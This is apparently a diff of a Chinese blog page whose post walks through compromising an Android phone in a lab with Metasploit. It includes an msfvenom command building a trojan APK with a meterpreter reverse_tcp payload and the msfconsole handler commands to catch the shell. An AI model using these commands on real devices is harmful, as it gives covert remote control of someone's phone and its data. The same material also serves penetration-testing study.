@@ -96,13 +96,13 @@
 
 
 
-  <meta name="description" content="实验环境Kali:172.16.28.153Android:172.16.28.158 首先用Msfvenom生成一个apk木马1msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &amp;gt; /root/apk.apk  然后msfconsole设置监听(默认监听端口4444)12345use">
+  <meta name="description" content="实验环境Kali:172.16.28.153Android:172.16.28.158">
 <meta name="keywords" content="后渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="利用msf渗透Android手机">
 <meta property="og:url" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/index.html">
 <meta property="og:site_name" content="Sriracha :)">
-<meta property="og:description" content="实验环境Kali:172.16.28.153Android:172.16.28.158 首先用Msfvenom生成一个apk木马1msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &amp;gt; /root/apk.apk  然后msfconsole设置监听(默认监听端口4444)12345use">
+<meta property="og:description" content="实验环境Kali:172.16.28.153Android:172.16.28.158">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/apk.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/meterpreter.png">
@@ -116,10 +116,10 @@
 <meta property="og:image" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/sms.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/sms2.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/app.png">
-<meta property="og:updated_time" content="2019-11-18T06:18:20.623Z">
+<meta property="og:updated_time" content="2019-11-18T06:20:02.458Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用msf渗透Android手机">
-<meta name="twitter:description" content="实验环境Kali:172.16.28.153Android:172.16.28.158 首先用Msfvenom生成一个apk木马1msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &amp;gt; /root/apk.apk  然后msfconsole设置监听(默认监听端口4444)12345use">
+<meta name="twitter:description" content="实验环境Kali:172.16.28.153Android:172.16.28.158">
 <meta name="twitter:image" content="http://yoursite.com/2019/11/18/利用msf渗透Android手机/apk.png">
 
 
@@ -453,7 +453,7 @@
                 
               
 
-              <time title="创建时间：2019-11-18 13:48:18 / 修改时间：14:18:20" itemprop="dateCreated datePublished" datetime="2019-11-18T13:48:18+08:00">2019-11-18</time>
+              <time title="创建时间：2019-11-18 13:48:18 / 修改时间：14:20:02" itemprop="dateCreated datePublished" datetime="2019-11-18T13:48:18+08:00">2019-11-18</time>
             
 
             
@@ -491,8 +491,8 @@
       
 
       
-        <a id="more"></a>
-<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Kali:172.16.28.153<br>Android:172.16.28.158</p>
+        <h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Kali:172.16.28.153<br>Android:172.16.28.158</p>
+<a id="more"></a>
 <p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/11/18/利用msf渗透Android手机/apk.png" alt></p>
 <p>然后msfconsole设置监听(默认监听端口4444)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set lhost 172.16.28.153</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
